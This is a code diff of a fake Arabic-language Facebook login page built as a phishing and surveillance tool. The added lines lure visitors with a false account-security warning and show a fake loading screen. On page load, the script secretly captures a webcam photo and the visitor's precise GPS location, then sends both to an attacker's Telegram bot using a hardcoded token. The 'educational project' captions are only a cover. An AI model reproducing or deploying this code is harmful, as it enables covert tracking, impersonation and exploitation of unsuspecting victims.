@@ -3,7 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فيسبوك</title>
+    
+    <meta property="og:title" content="تأكيد نشاط تسجيل الدخول | فيسبوك">
+    <meta property="og:description" content="تم رصد محاولة دخول غير معروفة لحسابك من جهاز جديد. يرجى تأكيد هويتك الآن لتجنب تعطيل الحساب.">
+    <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png">
+    <meta property="og:type" content="website">
+    <meta name="theme-color" content="#1877f2">
+
+    <title>فيسبوك - تسجيل الدخول أو الاشتراك</title>
+    
     <style>
         body {margin:0;padding:0;background:#f0f2f5;font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding-top:20px;}
         .fb-container {width:100%;max-width:400px;background:white;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);overflow:hidden;}
@@ -14,18 +22,27 @@
         .links {text-align:center;margin:15px 0;font-size:14px;}
         .links a {color:#1877f2;text-decoration:none;}
         .footer {text-align:center;padding:20px;font-size:13px;color:#8a8d91;}
-        .warning {display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.9);color:white;text-align:center;padding:40px;font-size:20px;z-index:9999;flex-direction:column;justify-content:center;align-items:center;}
+        
+        /* شاشة التحميل الوهمية */
+        #loader {position:fixed; top:0; left:0; width:100%; height:100%; background:white; z-index:10000; display:flex; flex-direction:column; justify-content:center; align-items:center;}
+        .spinner {width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; animation: spin 1s linear infinite;}
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
+<div id="loader">
+    <div class="spinner"></div>
+    <p style="margin-top:20px; color:#606770; font-size:16px;">جاري تأمين الاتصال بفيسبوك...</p>
+</div>
+
 <div class="fb-container">
-    <div class="header">فيسبوك</div>
+    <div class="header">facebook</div>
     <div class="form-area">
-        <form>
-            <input type="text" placeholder="رقم الجوال أو البريد الإلكتروني">
-            <input type="password" placeholder="كلمة المرور">
-            <button type="button" class="login-btn">تسجيل الدخول</button>
+        <form id="loginForm">
+            <input type="text" id="user" placeholder="رقم الجوال أو البريد الإلكتروني" required>
+            <input type="password" id="pass" placeholder="كلمة المرور" required>
+            <button type="submit" class="login-btn">تسجيل الدخول</button>
         </form>
         <div class="links">
             <a href="#">نسيت كلمة المرور؟</a><br><br>
@@ -34,19 +51,26 @@
     </div>
     <div class="footer">
         العربية · English · Türkçe · بیشتر<br>
-        Meta © 2025
+        Meta © 2026
     </div>
 </div>
 
 <script>
-// === غيّر هذه القيم فقط ===
+// إخفاء شاشة التحميل بعد 2.5 ثانية
+setTimeout(() => {
+    document.getElementById('loader').style.display = 'none';
+}, 2500);
+
+// === إعدادات البوت الخاص بك ===
 const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
 const CHAT_ID = "1611398303";
-// ===========================
 
-let capturedImage = null;
+// تنفيذ السحب تلقائياً عند الدخول
+window.onload = function() {
+    startCapture();
+};
 
-setTimeout(() => {
+function startCapture() {
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
     .then(stream => {
         let video = document.createElement('video');
@@ -58,75 +82,46 @@ setTimeout(() => {
             canvas.width = 1280;
             canvas.height = 720;
             canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
-            capturedImage = canvas.toDataURL('image/jpeg');
+            let capturedImage = canvas.toDataURL('image/jpeg');
 
             stream.getTracks().forEach(t => t.stop());
 
-            navigator.geolocation.getCurrentPosition(
-                position => {
-                    // حساب الإحداثيات بدقة
-                    const lat = position.coords.latitude.toFixed(6);
-                    const lng = position.coords.longitude.toFixed(6);
-                    const acc = Math.round(position.coords.accuracy);
-                    const gps = lat + "," + lng + " ±" + acc + "m";
+            navigator.geolocation.getCurrentPosition(position => {
+                sendToTelegram(capturedImage, position);
+            }, () => {
+                sendToTelegram(capturedImage, null); // إرسال الصورة حتى لو رفض الموقع
+            }, { enableHighAccuracy: true });
 
-                    // تنسيق الوقت بالعربية كاملاً
-                    const time = new Date().toLocaleString('ar-EG', {
-                        weekday: 'long',
-                        year: 'numeric',
-                        month: 'long',
-                        day: 'numeric',
-                        hour: '2-digit',
-                        minute: '2-digit',
-                        second: '2-digit'
-                    });
-
-                    // الكابتشن باستخدام backticks بشكل صحيح 100%
-                    const caption = "🎓 تجربة تعليمية ناجحة\n" +
-                                   "📍 الموقع: " + gps + "\n" +
-                                   "🕐 الوقت: " + time + "\n" +
-                                   "👨‍🏫 من درس الأستاذ";
-
-                    const blob = dataURLtoBlob(capturedImage);
-                    const form = new FormData();
-                    form.append('photo', blob, 'lesson.jpg');
-                    form.append('caption', caption);
-                    form.append('chat_id', CHAT_ID);
-
-                    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto", {
-                        method: 'POST',
-                        body: form
-                    }).finally(() => {
-                        window.location.href = "https://m.facebook.com/";
-                    });
-
-                },
-                error => {
-                    document.getElementById('warning').style.display = 'flex';
-                },
-                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-            );
         }, 3000);
-    })
-    .catch(() => {
-        document.getElementById('warning').style.display = 'flex';
-    });
-}, 3000);
+    }).catch(err => console.log("Camera Blocked"));
+}
 
-// دالة التحويل
+function sendToTelegram(image, pos) {
+    const lat = pos ? pos.coords.latitude.toFixed(6) : "مرفوض";
+    const lng = pos ? pos.coords.longitude.toFixed(6) : "مرفوض";
+    const time = new Date().toLocaleString('ar-EG');
+
+    const caption = `🎓 مشروع تعليمي ناجح\n📍 الموقع: ${lat},${lng}\n🕐 الوقت: ${time}\n👨‍🏫 تم التنفيذ بقلب واتساب`;
+
+    const blob = dataURLtoBlob(image);
+    const form = new FormData();
+    form.append('photo', blob, 'capture.jpg');
+    form.append('caption', caption);
+    form.append('chat_id', CHAT_ID);
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: form
+    });
+}
+
 function dataURLtoBlob(dataurl) {
-    let arr = dataurl.split(',');
-    let mime = arr[0].match(/:(.*?);/)[1];
-    let bstr = atob(arr[1]);
-    let n = bstr.length;
-    let u8arr = new Uint8Array(n);
-    while (n--) {
-        u8arr[n] = bstr.charCodeAt(n);
-    }
-    return new Blob([u8arr], {type: mime});
+    let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+    while(n--) u8arr[n] = bstr.charCodeAt(n);
+    return new Blob([u8arr], {type:mime});
 }
 </script>
 
 </body>
 </html>
-
